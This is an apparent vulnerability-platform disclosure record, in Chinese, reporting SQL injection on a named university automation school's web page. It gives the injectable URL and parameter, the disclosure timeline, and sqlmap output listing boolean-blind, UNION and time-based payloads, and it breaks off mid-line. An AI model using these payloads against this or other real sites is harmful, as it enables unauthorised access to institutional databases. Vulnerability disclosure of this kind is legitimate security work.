wybug_title: 某自动化学院SQL注入(可遍历目录)
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-01-13：	细节已通知厂商并且等待厂商处理中									2015-01-18：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入 详细说明：  SQL注入！   漏洞证明：  注入点:http://au.cug.edu.cn/jsxx/jsxx.php?mid=75sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: mid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: mid=75 AND 1095=1095    Type: UNION query    Title: MySQL UNION query (NULL) - 38 columns    Payload: mid=75 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71647a7671,0x675651627a65715a7865,0x7179757a71),NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: mid=75 AND 3817=BENCHMARK(5000000,MD5(0x79615871))---[14:19:04] [INFO] the back-end DBMS is
